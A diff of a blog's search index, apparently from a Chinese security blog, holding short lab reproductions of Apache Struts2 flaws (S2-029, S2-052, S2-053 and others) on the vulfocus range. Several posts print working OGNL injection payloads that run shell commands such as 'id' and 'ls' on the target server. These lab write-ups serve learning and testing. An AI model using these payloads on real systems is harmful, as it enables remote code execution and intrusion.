@@ -60,29 +60,6 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-029 CVE-2016-0785复现过程</title>
-    <url>/2020/08/14/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li>
-<li>POC利用</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>S2-019 CVE-2013-4316复现过程</title>
     <url>/2020/08/14/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
@@ -90,25 +67,6 @@
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
 <li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
 <li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-052 CVE-2017-9805复现过程</title>
-    <url>/2020/08/14/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p>
-</li>
-<li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p>
-</li>
 </ol>
 ]]></content>
       <categories>
@@ -129,6 +87,29 @@
 <li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
 </li>
 </ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-029 CVE-2016-0785复现过程</title>
+    <url>/2020/08/14/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li>
+<li>POC利用</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>vulfocus靶场练习</category>
@@ -163,18 +144,15 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-053 CVE-2017-12611复现过程</title>
-    <url>/2020/08/14/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
+    <title>S2-052 CVE-2017-9805复现过程</title>
+    <url>/2020/08/14/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li>
-<li>利用POC</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p>
+</li>
+<li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p>
+</li>
 </ol>
 ]]></content>
       <categories>
@@ -196,6 +174,28 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
 </li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-053 CVE-2017-12611复现过程</title>
+    <url>/2020/08/14/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li>
+<li>利用POC</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
 </ol>
 ]]></content>
       <categories>
@@ -430,23 +430,5 @@
       <tags>
         <tag>401爆破</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2020/09/17/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
 </search>
